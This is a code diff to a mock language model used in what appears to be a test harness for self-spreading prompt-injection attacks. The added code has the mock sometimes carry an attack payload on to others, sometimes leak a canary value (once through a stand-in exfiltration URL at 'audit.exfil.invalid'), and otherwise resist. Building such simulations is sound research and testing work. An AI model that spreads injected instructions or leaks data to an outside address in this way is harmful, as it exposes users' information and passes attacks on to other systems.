@@ -312,14 +312,21 @@ class MockLLM:
         self.usage.chat_calls += 1
         await asyncio.sleep(0)
         system = messages[0]["content"] if messages and messages[0]["role"] == "system" else ""
-        user = messages[-1]["content"]
-        rng = self._rng(messages)
+        last = messages[-1]["content"]
+        has_image = isinstance(last, list) and any(c.get("type") == "image_url" for c in last
+                                                    if isinstance(c, dict))
+        user = _content_text(last)
+        rng = self._rng([m if isinstance(m.get("content"), str) else
+                         {**m, "content": user} for m in messages])
         if system.startswith(scenario.WHO_SYSTEM[:40]):
             return self._who(user, rng)
         topic_m = re.search(r"about (.+?)\. Reply", user)
         topic = topic_m.group(1) if topic_m else "my tasks"
         body = rng.choice(_CLEAN_BODIES).format(topic=topic)
         carried = _carried_paragraph(user)
+        atk = None if carried else _mock_attack(user, has_image)
+        if atk is not None:
+            return self._attack_reply(atk, body, system, rng)
         if carried and rng.random() < self.p_copy(system):
             if rng.random() < 0.15:
                 carried = rng.choice(_VARIANTS)
@@ -327,6 +334,24 @@ class MockLLM:
         if carried:
             return body + rng.choice(_RESIST_NOTES)
         return body
+
+    def _attack_reply(self, atk, body: str, system: str, rng: random.Random) -> str:
+        """Scripted response to a catalogue attack: carry it on, only obey, or resist."""
+        from .attacks import to_tags
+
+        p = min(0.98, self.p_copy(system) * atk.mock_factor)
+        r = rng.random()
+        if r < p:                                   # carries the attack on
+            if atk.channel == "hidden":
+                return body + to_tags(atk.payload)
+            if atk.channel == "image":
+                return f"{body} Please share the team luck card with everyone. {atk.canary}"
+            return f"{body}\n\n{atk.payload}"
+        if r < p + 0.15:                            # obeys / leaks, does not spread
+            if atk.id == "echoleak":
+                return f"{body} Ref: https://audit.exfil.invalid/r?d={atk.canary}"
+            return f"{body} {atk.canary}"
+        return body + rng.choice(_RESIST_NOTES)
 
     def _who(self, user: str, rng: random.Random) -> str:
         if "system-prompt addition" in user:
@@ -414,6 +439,16 @@ def _carried_paragraph(user: str) -> str | None:
         if ("chain" in low and ("copy" in low or "passes this on" in low)) or "pass it on" in low:
             return para
     return None
+
+
+def _mock_attack(user: str, has_image: bool):
+    """Which catalogue attack the mock model has in front of it, if any."""
+    from . import attacks
+
+    if has_image:
+        return attacks.ATTACKS["agent-smith"]
+    m = re.search(r"---\n(.*)\n---", user, re.S)
+    return attacks.find_in(m.group(1) if m else user)
 
 
 def make_llm(s: Settings, seed: int = 0):
